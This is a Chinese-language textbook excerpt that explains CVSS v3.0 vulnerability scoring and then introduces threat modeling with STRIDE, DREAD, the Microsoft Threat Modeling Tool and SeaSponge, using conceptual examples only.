# 使用 CVSS 进行漏洞评分

漏洞评分确实是一个非常主观的问题。它取决于上下文和评分漏洞的人的专业知识。因此，在没有任何标准系统的情况下，对同一个漏洞进行评分可能会因人而异。

CVSS 是一个用于评分漏洞的标准系统。在得出最终评分之前，它考虑了几个不同的参数。使用 CVSS 具有以下好处：

+   它提供了标准化和一致的漏洞评分

+   它提供了一个开放的漏洞评分框架，使得评分的个体特征透明化

+   CVSS 有助于风险优先级排序

为了简化目的，CVSS 指标被分类为各种组，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/6c9cae04-a146-4b6f-87b7-80c822a88fbf.jpg)

我们将在接下来的章节中简要介绍每个指标类别。

# 基本指标组

基本指标组定义了给定漏洞的一些固定特征，这些特征随时间和用户环境保持不变。基本指标组被分类为两个子组，如下一节所讨论的。

# 可利用性指标

正如前面提到的，可利用性指标反映了易受攻击的*事物*的特性，我们正式称之为**易受攻击组件**。因此，这里列出的每个可利用性指标都应该相对于易受攻击组件进行评分，并反映导致成功攻击的漏洞的属性。

# 攻击向量

攻击向量只是攻击者成功利用漏洞所采取的路径。攻击向量指标表示漏洞可能被利用的方式。在互联网上远程利用的漏洞的潜在攻击者数量比需要物理访问设备的漏洞的攻击者数量要多，因此指标值会随着攻击者远程利用漏洞的程度而增加。

| **参数** | **描述** | **示例** |
| --- | --- | --- |
| 网络 | 漏洞可能通过网络远程利用。易受攻击的组件连接到网络，攻击者可以通过第 3 层（OSI）访问它。 | 发送特制的 TCP 数据包导致的拒绝服务 |
| 相邻 | 漏洞可以在相同的物理或逻辑网络内被利用。它不能在网络边界之外被利用。 | 蓝牙攻击，ARP 洪泛 |
| 本地 | 易受攻击的组件无论如何都未连接到网络，攻击者必须在本地登录才能利用漏洞。 | 特权升级 |
| 物理 | 只有在攻击者可以物理访问易受攻击的系统/组件时，漏洞才能被利用。 | 冷启动攻击 |

# 攻击复杂度

攻击复杂度度量列出了攻击者无法控制但是利用漏洞所需的所有条件和先决条件。例如，可能存在某个特定漏洞只有在特定版本的应用程序部署在某个特定的操作系统平台上并具有一些自定义设置时才能被利用。只有满足所有这些条件，漏洞利用才可能发生。对于其他一些漏洞，可能无论应用程序版本和基本操作系统的类型如何，都可以利用。因此，条件和先决条件增加了攻击的复杂性，并且因漏洞而异：

| **参数** | **描述** | **示例** |
| --- | --- | --- |
| 低 | 不存在任何可能阻碍攻击者重复成功利用易受攻击的组件的特定条件或先决条件。 | 发送特制的 TCP 数据包导致的拒绝服务 |
| 高 | 攻击的成功依赖于攻击者无法控制的特定条件。因此，攻击者不能随心所欲地发动成功的攻击，需要在准备攻击方面付出相当大的努力。 | 涉及随机令牌、序列号等攻击 |

# 所需特权

所需特权度量定义了攻击者必须具有的特权级别，以成功利用漏洞。可能存在一些漏洞可以在正常特权级别下被利用，而其他可能严格要求 root 或管理员级别的特权才能成功利用：

| **参数** | **描述** |
| --- | --- |
| 无 | 攻击者不需要任何先前特权或访问权限来执行攻击。 |
| 低 | 攻击者需要有限或最低特权才能成功执行攻击。 |
| 高 | 攻击者需要显著的特权，如管理员或根权限，才能利用易受攻击的组件。 |

# 用户交互

用户交互度指示目标用户除了攻击者的行动之外需要执行的操作，以成功利用漏洞。一些漏洞可能仅由攻击者利用，而其他可能需要额外的用户交互/参与：

| **参数** | **描述** | **示例** |
| --- | --- | --- |
| 无 | 攻击者可以在不需要受害者/用户任何交互的情况下利用易受攻击的系统/组件。 | 发送特制的 TCP 数据包导致的拒绝服务 |
| 必需 | 攻击者需要受害者（用户）执行某种操作才能利用漏洞。 | 无线点击攻击，点击劫持 |

# 范围

CVSS 3.0 允许我们捕获组件漏洞的指标，这也会影响其范围之外的资源。范围指的是受漏洞影响的脆弱组件的哪些部分或者利用漏洞会影响哪些关联。范围由授权机构分隔。漏洞可能会影响相同授权机构内或不同授权机构内的组件。例如，允许攻击者修改基础（主机）系统文件的虚拟机中的漏洞将包括两个系统在范围内，而允许攻击者修改系统主机文件的 Microsoft Word 中的漏洞将属于单一授权机构：

| **参数** | **描述** |
| --- | --- |
| 未更改 | 利用漏洞只会影响受影响组件管理的资源 |
| 更改 | 利用漏洞可能会影响脆弱组件边界之外的资源 |

# 影响度指标

影响度指标表示受影响组件的机密性、完整性和可用性等各种属性。

# 机密性影响

机密性影响表示成功利用漏洞后信息机密性的影响：

| **参数** | **描述** |
| --- | --- |
| 高 | 完全丧失机密性，导致攻击者完全访问资源。例如，对密码的攻击和窃取私人加密密钥可能导致机密性完全丧失。 |
| 低 | 机密性有限损失。虽然获取了机密信息，但攻击者无法完全控制获取的信息。 |
| 无 | 受影响组件内机密性没有影响。 |

# 完整性影响

完整性影响指标表示成功利用漏洞后信息完整性的影响：

| **参数** | **描述** |
| --- | --- |
| 高 | 完全丧失完整性。例如，攻击者能够修改受影响组件保护的所有文件。如果攻击者能够部分修改信息，这将导致严重后果。 |
| 低 | 虽然数据可能被修改，但攻击者无法完全控制修改的数量或后果。受影响组件没有严重影响。 |
| 无 | 受影响组件内完整性没有影响。 |

# 可用性影响

可用性影响指标表示成功利用漏洞后受影响组件的可用性影响。可用性的丧失可能是由于网络服务停止，如 Web、数据库或电子邮件。所有倾向于消耗网络带宽、处理器周期或磁盘空间资源的攻击都可以由此指标表示：

| **参数** | **描述** |
| --- | --- |
| 高 | 完全丧失可用性，导致无法访问受影响组件的资源 |
| 低 | 资源可用性受到有限影响 |
| 无 | 受影响组件内可用性没有影响 |

# 时间度量组

时间度量指标表示各种利用技术、补丁或解决方法的现有状态，或者对漏洞存在的程度的信心。

# 利用代码成熟度

利用代码成熟度指标表示漏洞被利用的可能性，取决于现有的利用技术状态和代码可用性。

一些利用代码可能是公开可用的，使它们易于许多攻击者访问。这增加了漏洞被利用的可能性。注意以下参数：

| **参数** | **描述** |
| --- | --- |
| 未定义 | 将此值分配给指标不会影响分数。它只是指示评分方程跳过此指标。 |
| 高 | 存在功能自主代码，或者不需要利用（手动触发）并且详细信息广泛可用。 |
| 功能 | 功能性利用代码可用，并且在大多数情况下有效。 |
| 概念验证 | 概念验证明显可用。代码可能在所有情况下都不起作用，并且可能需要熟练攻击者进行大量编辑。 |
| 未经证实 | 利用代码不可用或利用只是假设的。 |

# 修复级别

修复级别度量标准表示可用于减轻漏洞的修复、补丁或解决方法的级别。它可以帮助优先处理漏洞修复：

| **参数** | **描述** |
| --- | --- |
| 未定义 | 将此值分配给度量标准不会影响分数。它只是指示评分方程跳过此度量标准。 |
| 不可用 | 不存在解决方案或者无法应用解决方案。 |
| 绕过 | 存在非官方的、非供应商的修复；这可能是一种内部补丁。 |
| 临时修复 | 官方的临时修复存在；可能以快速修复/热修复的形式存在。 |
| 官方修复 | 存在完整且经过测试的修复，并且供应商已正式发布。 |

环境度量标准仅在分析人员需要在受影响组织的特定领域定制 CVSS 分数时使用。您可以在[`www.first.org/cvss/cvss-v30-specification-v1.8.pdf`](https://www.first.org/cvss/cvss-v30-specification-v1.8.pdf)上阅读更多关于环境度量标准的信息。

# 报告信心

报告信心度量标准表示对漏洞存在和资源以及技术细节的真实性的信心水平。可能某个特定漏洞发布时没有额外的技术细节。在这种情况下，根本原因和影响可能是未知的：

| **参数** | **描述** |
| --- | --- |
| 未定义 | 将此值分配给度量标准不会影响分数。它只是指示评分方程跳过此度量标准。 |
| 确认 | 存在全面的报告或漏洞/问题可以在功能上重现。可能有源代码可用于手动验证研究结果，或者受影响代码的作者/供应商已确认漏洞的存在。 |
| 合理 | 已发布了相当多的细节，但研究人员对根本原因并不完全有信心。研究人员可能无法访问源代码以确认研究结果。 |
| 未知 | 有关漏洞存在的报告；然而，其原因是未知的。对漏洞的真实性存在不确定性。 |

# CVSS 计算器

在前面的部分中，我们看了计算最终 CVSS 分数所考虑的各种度量标准类别。在计算分数时考虑这么多值可能看起来令人不知所措。然而，通过使用在线 CVSS 计算器，这项任务变得很容易。它可以在[`www.first.org/cvss/calculator/3.0`](https://www.first.org/cvss/calculator/3.0)上访问。

在线 CVSS 计算器具有所有必需的参数，您需要根据您的环境和漏洞上下文选择合适的参数。完成后，最终分数将自动填充。

以下屏幕截图显示了在为任何参数选择值之前的 CVSS 计算器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/50108bdf-debc-41d1-8ec0-152fb541fe0d.png)

考虑一个可能在网络上远程利用的漏洞，执行起来非常复杂，需要高权限账户，并且需要目标用户的某种互动，同时对机密性、完整性和可用性的影响很小。在这种情况下，CVSS 分数将是 3.9，并被评为低，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/fce6f7d4-8237-43b4-b26d-9ec4ef32b3bc.png)

让我们考虑另一个可能在网络上远程利用的漏洞；然而，它非常容易执行。它需要低或正常的账户权限，并需要目标用户的某种交互，而对机密性、完整性和可用性的影响很小。在这种情况下，CVSS 评分将为 5.5，并被评为中等，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/d09ccbe4-a9a3-4dc0-a499-846e3bbc64bd.png)

让我们考虑另一个可能在网络上远程利用的漏洞。然而，它非常容易执行，不需要任何特定的账户权限，也不需要目标用户的任何交互。如果漏洞成功被利用，对机密性和完整性的影响将很大，而可用性的影响将很小。在这种情况下，CVSS 评分将为 9.4，并被评为关键，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/ec00a0a2-f3c9-45e5-8aa1-13ae349f8d2d.png)

# 摘要

在本章中，我们了解了漏洞评分的重要性以及评分任何给定漏洞需要考虑的各种参数。


# 第十九章：威胁建模

本章是关于理解和准备威胁模型。您将了解威胁建模的基本概念，并获得使用各种威胁建模工具的实际知识。

我们将在本章中涵盖以下主题：

+   定义威胁建模

+   威胁建模的好处

+   威胁建模术语

+   执行威胁建模的逐步程序

+   威胁建模的技术-STRIDE、PASTA、DREAD

+   微软威胁建模工具和 SeaSponge

# 什么是威胁建模？

**威胁建模**这个术语，起初可能听起来非常复杂和繁琐。然而，一旦理解，它确实是一个简单的任务。我们将在本章中通过适当的插图来简化威胁建模的概念。

让我们试着分解这两个词，威胁和模型。以下是这两个词的词典含义：

+   **威胁**：可能造成损害或危险的人或事物

+   **模型**：作为跟随或模仿的示例使用的系统或事物

现在，再次结合这两个词，它们共同意味着什么？**威胁建模**只不过是一种正式的方式来识别潜在的安全问题。

让我们举一个非常简单的例子来理解这一点。

以下图表描述了一座堡垒：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/e4e4c4b1-5f22-40ec-9f63-72f98f02102a.png)

这座堡垒是国王居住的地方，需要严格的安全措施来对抗他的敌人。因此，建筑师在设计堡垒的结构时，也需要考虑可能危及堡垒安全的各种威胁。

一旦建筑师确定了可能的威胁，他们就可以通过各种可能的手段来减轻威胁。堡垒的一些威胁可能是以下的：

+   敌人通过后方攻击，那里的堡垒防守较弱

+   敌人向堡垒的墙壁发射炮弹

+   由于极端天气导致堡垒墙壁的腐蚀和磨损

+   敌方大象强行打破堡垒的主入口门

我们刚刚为一座古老的堡垒准备了一个威胁模型。这很简单；我们试图想出所有可能的方式，通过这些方式堡垒的安全可能会被故意或无意地破坏。同样，在建造总统府或任何重要的行政办公室时，都必须准备威胁模型。

从前面的例子中，我们可以理解威胁建模是一个通用的概念，可以应用于任何需要安全的领域或领域。由于本书涉及信息安全，我们将讨论如何为给定的信息系统准备威胁模型。

如果在开发生命周期的设计阶段进行威胁建模，那么威胁建模可能会最有效和有益。在 SDLC 的后期阶段修复错误的成本显著上升。

威胁建模在软件开发生命周期中非常常用。它使软件开发过程中的参与者能够高效地创建和交付安全软件，并更有信心地了解和考虑所有可能的安全缺陷。

# 威胁建模的好处

对于任何给定的项目，了解可能妨碍整体进展的威胁总是有帮助的。威胁建模正是做同样的事情。威胁建模的一些好处包括：

+   威胁建模通过设计本身就能够产生安全的软件-如果在设计阶段正确进行威胁建模，那么最终产品将在很大程度上对抗大多数常见的潜在威胁。

+   威胁建模允许我们以更有结构的方式思考和讨论产品安全-威胁建模提供了一种更正式和有结构的方式来列举和记录安全威胁，而不是以临时方式讨论安全威胁。

+   威胁建模允许开发团队在 SDLC 过程的早期有效地识别和定义安全缺陷。

+   威胁建模允许我们记录和分享应用程序安全知识——随着技术的快速升级，威胁形势也在快速变化。持续的威胁建模练习将有助于确保最新的威胁被考虑并预期用于设计缓解控制措施。

+   威胁建模增加了客户对安全的信心——威胁建模过程的文档化证据肯定会增强客户对系统安全的信心。

+   持续的威胁建模练习将有助于减少整体攻击面积。

+   威胁建模有助于量化安全控制，使其更实际地与安全预算保持一致。

# 威胁建模术语

在我们深入讨论如何建模威胁之前，我们必须熟悉威胁建模过程中使用的一些常见术语。一些常见术语如下：

+   **资产**: 资产可以是有价值的任何资源。资产可以是有形的或无形的。例如，数据中心中的大型计算机可能是有形资产，而组织的声誉可能是无形资产。

+   **攻击**: 当参与者或威胁代理利用系统中的一个或多个漏洞采取行动时，就会发生攻击。例如，当有人利用跨站脚本漏洞窃取用户 cookie 和会话 ID 时，可能会发生应用程序会话劫持攻击。

+   **攻击向量**: 攻击向量是攻击者成功损害系统所采取的路径。例如，向受害者发送带有恶意附件的电子邮件可能是一种可能的攻击向量。

+   **攻击面**: 攻击面基本上标记了需要在列举威胁时考虑的范围内组件。攻击面可以是逻辑的或物理的。

+   **对策**: 简单来说，对策有助于解决或减轻漏洞，从而降低攻击的可能性，进而降低威胁的影响。例如，安装防病毒软件可以是应对病毒威胁的一种对策。

+   **使用案例**: 使用案例是符合业务需求的正常功能情况。例如，允许最终用户选择喜欢的颜色的下拉菜单可能是应用程序的使用案例之一。

+   **滥用案例**: 当用户（参与者）故意滥用功能使用案例以达到意外结果时，称为滥用案例。例如，攻击者可能向最大长度为 20 的输入字段发送 1000 个字符。

+   **参与者或威胁代理**: 参与者或威胁代理可能是使用或滥用案例的合法或不利用户。例如，使用有效凭据登录应用程序的普通最终用户是一个参与者，而使用 SQL 注入登录应用程序的攻击者也是一个参与者（威胁代理）。

+   **影响**: 简单来说，影响是成功攻击后的损害价值。它可以是有形的或无形的。如果系统中的财务数据被突破，可能会产生收入影响，而如果公司网站被篡改，可能会产生声誉影响。

+   **攻击树**: 攻击树以可视化方式展示了成功攻击或损害目标的各种路径。以下图表显示了获取对 Windows 系统访问的样本攻击树：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/dd0b66c9-3d66-4b8c-b007-d2dfcde74785.png)

+   **数据流图**: 用于可视化系统各组件之间的交互的各种类型的图表。尽管有不同类型的威胁建模图表，但最常用的类型是**数据流图**（**DFD**）。DFD 用于显示应用程序的主要组件以及这些组件之间的信息流动。DFD 还显示了信任边界，显示了可信信息和在应用程序中使用时需要额外注意的信息之间的分离。

# 如何建模威胁？

威胁建模的过程可以根据多种因素而变化。然而，一般来说，威胁建模过程可以分解为以下步骤：

1.  **安全目标的识别**: 在实际开始威胁建模之前，了解进行威胁建模练习背后的目标是非常重要的。可能存在某些需要解决的合规性或监管要求。一旦了解了驱动因素，就更容易在过程中可视化可能的威胁。

1.  **资产和外部因素/依赖的识别**: 除非我们确切知道我们要保护什么，否则就不可能列举出威胁。识别资产有助于建立进一步建模过程的基础。资产需要受到攻击者的保护，并且可能需要优先考虑采取对策。还需要识别可能的外部实体或依赖关系，这些可能不是系统的直接部分，但仍可能对系统构成威胁。

1.  **信任区域的识别**: 一旦确定了资产和外部依赖关系，下一步就是识别所有入口点和出口点以及信任区域。这些信息可以有效用于开发带有信任边界的数据流图。

1.  **识别潜在威胁和漏洞**: 威胁建模技术，如 STRIDE（在接下来的部分中讨论），可以给出关于影响给定系统的常见威胁的简要概念。一些例子可能包括 XSS、CSRF、SQL 注入、不正确的授权、破损的身份验证和会话管理漏洞。然后需要识别和评估更容易受到风险的系统区域，例如不足的输入验证、不当的异常处理、缺乏审计日志记录等。

1.  **威胁模型的文档化**: 威胁建模不是一次性的活动；相反，它是一个迭代过程。在每次迭代后全面记录威胁是非常重要的。文档可以为架构师提供关于需要在设计系统时考虑的可能威胁的良好参考，并且还允许他们考虑可能的对策。开发人员也可以在开发阶段参考威胁建模文档，以明确处理某些威胁场景。

# 威胁建模技术

有各种威胁建模技术和方法。STRIDE 和 DREAD 就是其中两种。我们将在接下来的部分学习 STRIDE 和 DREAD 的方法论。

# STRIDE

STRIDE 是微软开发的一种易于使用的威胁建模方法。STRIDE 有助于识别威胁，是以下术语的缩写：

+   **S—欺骗**: 欺骗类的威胁包括对手创建和利用有关某人或某物身份的混淆。

例如，对手发送电子邮件给用户，假装是别人。

+   **T—篡改**: 篡改威胁涉及对手在存储或传输中对数据进行修改。

例如，对手拦截网络数据包，更改支付信息，然后转发给目标。

+   **R—否认**: 否认包括对手执行某种行动，然后事后否认执行了该行动。

例如，对手向受害者发送威胁性邮件，后来否认发送该邮件。

+   **I—信息泄露**：信息泄露威胁涉及对机密信息进行未经授权的访问。

例如，对手使用暴力攻击获取用户的密码。

对手获取了包含许多用户付款信息的数据库。

+   **D—服务拒绝**：服务拒绝威胁涉及拒绝合法用户访问系统或组件。

例如，对手通过发送一个特制的 TCP 数据包导致 Web 服务器崩溃，从而拒绝合法用户访问。

+   **E—权限提升**：权限提升威胁涉及用户或组件能够访问未经授权的数据或程序。

例如，一个甚至没有读取权限的对手也能够修改文件。

一个普通（非特权）账户的对手能够执行管理员级别的任务。

上述威胁清单可以应用于目标模型的组件。多个威胁可以被归类为威胁类别，如下表所示：

| **DREAD 类别** | **威胁示例** |
| --- | --- |
| 伪装 | 攻击者冒充管理员，向组织中的所有用户发送钓鱼邮件。 |
| 篡改 | 攻击者拦截并修改发送到应用程序的数据。 |
| 否认 | 攻击者发送威胁性邮件，后来否认发送该邮件。 |
| 信息泄露 | 攻击者获取包含用户凭据的数据库的明文信息。 |
| 服务拒绝 | 攻击者从多个来源向单个目标发送大量数据包，以使其崩溃。 |
| 权限提升 | 攻击者利用易受攻击的组件来提升权限。 |

# DREAD

虽然 STRIDE 方法可以用于识别威胁，但 DREAD 方法可以有效地对威胁进行评级。DREAD 是以下术语的缩写：

+   **D—损害潜力**：损害潜力因素定义了如果利用成功可能造成的潜在损害。

+   **R—可重现性**：可重现性因素定义了再现利用的容易或困难程度。某些利用可能非常容易再现，而另一个可能由于多个依赖关系而困难。

+   **E—可利用性**：可利用性因素定义了使利用成功所需的确切条件。这可能包括对特定领域的知识，或对某种工具的技能等。

+   **A—受影响的用户**：受影响的用户因素定义了如果利用成功将受到影响的用户数量。

+   **D—可发现性**：可发现性因素定义了考虑中的威胁可以被发现的容易程度。环境中的一些威胁可能很容易被注意到，而另一些可能需要使用额外的技术来揭示。

因此，STRIDE 和 DREAD 可以结合使用，以产生有效和可操作的威胁模型。

# 威胁建模工具

尽管威胁建模可以很容易地用简单的纸和笔完成，但也有一些专门的工具可用于简化整个过程。我们将看看两种可以有效用于建模威胁的工具。

# 微软威胁建模工具

用于威胁建模的最广泛使用的工具是微软威胁建模工具。它可以免费提供给所有人，并可以从[`www.microsoft.com/en-in/download/details.aspx?id=49168`](https://www.microsoft.com/en-in/download/details.aspx?id=49168)下载。

一旦下载并安装，初始屏幕如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/727f4694-6619-4a0e-885d-66dd2a0e8835.png)

单击“创建模型”开始设计新的威胁模型，如下屏幕截图所示。您将看到一个空白画布，可以继续设计：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/b50a4f9e-ede8-4ce7-80c1-901b55266205.png)

右侧窗格如下屏幕截图所示，具有所有必要的元素。您可以简单地将所需的元素拖放到画布中，如下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/2ff1c3ba-9ee8-46c8-aeac-1a52eaeb9eea.png)

一旦所有组件都添加并连接，威胁模型应该看起来像下面的屏幕截图所示的样子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/6d79ac77-1381-4144-bdc4-ba2fcac5a230.png)

为了为给定的威胁模型列举威胁，选择“查看|分析视图”。分析窗格提供了有关给定威胁模型对应的各种威胁的信息，如下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/fe5587e7-b7ac-4979-9d91-708fb18e1a54.jpg)

为了生成威胁报告，选择“报告|创建完整报告”，然后选择

报告的文件名和路径，如下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/6c0a5579-a23b-4e42-9d64-81eb1fc112b6.png)

# SeaSponge

SeaSponge 是另一个项目（这次是由 Mozilla 开发）用于建模威胁。您可以从[`github.com/mozilla/seasponge`](https://github.com/mozilla/seasponge)下载它以供离线使用，或者它还有一个在线版本可用于建模威胁。在线版本位于[`mozilla.github.io/seasponge`](http://mozilla.github.io/seasponge)。

以下屏幕截图显示了 SeaSponge 在线工具的第一个屏幕。我们可以通过单击“创建模型”来开始创建一个新模型：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/50e75c77-9b0f-41ab-b303-da05be6ea860.png)

然后工具会要求一些元数据，如项目标题、作者、版本等，如下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/1920e17c-1388-4d30-b2ab-6dc73139b02d.png)

然后工具会为我们提供一个空白画布，左侧窗格会给我们添加组件的选项，如下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/8bab821e-fe5b-4f27-99f1-e97eee001817.jpg)

我们现在可以根据需要向我们的威胁模型添加不同的元素，如下图所示。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/f2fe2250-21e3-4eae-bba0-ac3d222c7790.jpg)

然而，与微软威胁建模工具自动列举可能的威胁不同，SeaSponge 要求用户手动列举并将威胁添加到模型中。

# 摘要

在本章中，我们学习了威胁建模、威胁建模的好处及其术语。我们还学习了不同的威胁建模技术，如 STRIDE 和 DREAD，以及微软威胁建模工具和 SeaSponge 等工具。
